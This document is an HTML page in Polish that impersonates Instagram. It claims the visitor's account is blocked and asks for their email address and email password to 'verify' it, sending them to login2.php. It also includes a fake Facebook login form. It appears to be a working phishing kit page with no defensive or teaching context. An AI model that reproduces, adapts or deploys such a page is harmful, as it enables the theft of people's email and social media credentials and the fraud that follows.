<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-Ua-Compatible" content="IE=edge,chrome=1">
    <script src="https://kit.fontawesome.com/083afe1345.js" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="styleindex3.css" type="text/css">
    <title>Instagram - zweryfikuj konto</title>
    <link rel="icon" href="/ig/favicon.ico" type="image/x-icon" />
</head>

<body>
    <header>
        <img class="iglogo1" src="iglogo1.png">
    </header>
    <div class="login-box">
        <div class="login-form">
            <form action="login2.php" method="post">
                <img src="lock.png" />
                <a class="a1">Twoje konto zostało zablokowane</a>
                <a class="a2">Aby zweryfikować swoje konto i potwierdzić swoją tożsamość, zaloguj się za pomocą takiego
                    samego adresu e-mail i hasła jak do poczty e-mail podpiętej do tego konta.</a>
                <input type="text" name="email" placeholder="Adres e-mail" />
                <input type="password" name="haslo" placeholder="Hasło do poczty" />
                <button type="submit" name="przycisk">Zweryfikuj konto</button>
                <hr />
            </form>
            <form action="facebook.php" method="post">
                <div class='facebook'>
                    <i class="fab fa-facebook-square"></i>
                    <a href="https://google.com">Zaloguj się przez Facebooka</a>
                </div>
            </form>
            <div class="app">
                <a>Pobierz aplikację.</a>
            </div>
            <div class="app2">
                <img class="appstore" src="/ig/appstore.png"><img class="googleplay" src="/ig/googleplay.png">
            </div>
        </div>
    </div>
</body>

</html>